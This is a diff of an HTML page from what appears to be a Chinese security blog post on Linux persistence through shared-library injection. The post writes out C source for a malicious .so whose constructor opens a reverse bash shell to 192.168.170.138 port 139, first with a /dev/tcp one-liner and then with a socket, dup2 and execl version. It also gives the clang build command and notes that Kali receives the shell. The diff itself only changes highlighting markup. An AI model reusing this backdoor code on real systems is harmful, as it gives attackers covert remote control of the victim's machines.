@@ -83,29 +83,27 @@
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7da8298c-4f5f-11ec-9dfb-00d861bf4abb.png" alt="2020-01-03-13-11-04"></p>
 <p>获取sample-target的PID后，调用inject程序来注入sample-library.so，注入成功会输出“I just got loaded”。
 接下来，需要更改sample-target.c文件，编译成需要的权限维持动态链接库。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-
-<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">shell</span>()
-{
-	printf(<span style="color:#e6db74">&#34;I just got loaded</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-    system(<span style="color:#e6db74">&#34;bash -c </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">bash -i &gt;&amp; /dev/tcp/192.168.170.138/139 0&gt;&amp;1</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>);
-   
-}
-
-
-__attribute__((constructor))
-<span style="color:#66d9ef">void</span> loadMsg()
-{
-   shell();
-}
-
-</code></pre></div><p>通过如下命令编译so文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">shell</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;I just got loaded</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    system(<span style="color:#e6db74">&#34;bash -c </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">bash -i &gt;&amp; /dev/tcp/192.168.170.138/139 0&gt;&amp;1</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__attribute__((constructor))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> loadMsg()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>   shell();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>通过如下命令编译so文件：</p>
 <pre tabindex="0"><code>clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o u9.so -lpthread -fPIC U3.c
-
 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7deb9a0a-4f5f-11ec-9a01-00d861bf4abb.png" alt="2020-01-03-13-11-16"></p>
 <p>编译成so文件成功后的测试效果：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7e2a248c-4f5f-11ec-b266-00d861bf4abb.png" alt="2020-01-03-13-11-27"></p>
@@ -118,56 +116,54 @@ __attribute__((constructor))
 <p>查看到IP与端口：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7f1565dc-4f5f-11ec-bacf-00d861bf4abb.png" alt="2020-01-03-13-12-19"></p>
 <p>再继续改进代码，采用socket套接字的方式来反弹shell：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;pthread.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netdb.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-
-<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">hello</span>()
-{
-
-    <span style="color:#66d9ef">struct</span> sockaddr_in server;
-    <span style="color:#66d9ef">int</span> sock;
-    <span style="color:#66d9ef">char</span> shell[]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span>;
-    <span style="color:#66d9ef">if</span>((sock <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
-        <span style="color:#66d9ef">return</span> NULL;
-    }
-
-    server.sin_family <span style="color:#f92672">=</span> AF_INET;
-    server.sin_port <span style="color:#f92672">=</span> htons(<span style="color:#ae81ff">139</span>);
-    server.sin_addr.s_addr <span style="color:#f92672">=</span> inet_addr(<span style="color:#e6db74">&#34;192.168.170.138&#34;</span>);
-    <span style="color:#66d9ef">if</span>(connect(sock, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>server, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sockaddr)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
-        <span style="color:#66d9ef">return</span> NULL;
-    }
-    dup2(sock, <span style="color:#ae81ff">0</span>);
-    dup2(sock, <span style="color:#ae81ff">1</span>);
-    dup2(sock, <span style="color:#ae81ff">2</span>);
-    execl(shell,<span style="color:#e6db74">&#34;/bin/bash&#34;</span>,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0</span>);
-    close(sock);
-	printf(<span style="color:#e6db74">&#34;I just got loaded</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-    <span style="color:#66d9ef">return</span> NULL;
-}
-
-__attribute__((constructor))
-<span style="color:#66d9ef">void</span> loadMsg()
-{
-    pthread_t thread_id;
-    pthread_create(<span style="color:#f92672">&amp;</span>thread_id,NULL,hello,NULL);
-}
-
-
-</code></pre></div><p>执行效果：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;pthread.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netdb.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">hello</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_in server;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> sock;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> shell[]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>((sock <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    server.sin_family <span style="color:#f92672">=</span> AF_INET;
+</span></span><span style="display:flex;"><span>    server.sin_port <span style="color:#f92672">=</span> htons(<span style="color:#ae81ff">139</span>);
+</span></span><span style="display:flex;"><span>    server.sin_addr.s_addr <span style="color:#f92672">=</span> inet_addr(<span style="color:#e6db74">&#34;192.168.170.138&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(connect(sock, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>server, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sockaddr)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    dup2(sock, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    dup2(sock, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    dup2(sock, <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>    execl(shell,<span style="color:#e6db74">&#34;/bin/bash&#34;</span>,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    close(sock);
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;I just got loaded</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__attribute__((constructor))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> loadMsg()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    pthread_t thread_id;
+</span></span><span style="display:flex;"><span>    pthread_create(<span style="color:#f92672">&amp;</span>thread_id,NULL,hello,NULL);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>执行效果：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7f567f90-4f5f-11ec-bb46-00d861bf4abb.png" alt="2020-01-03-13-12-35"></p>
 <p>Kali Linux获得bash shell：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7f96bea2-4f5f-11ec-8151-00d861bf4abb.png" alt="2020-01-03-13-12-46"></p>
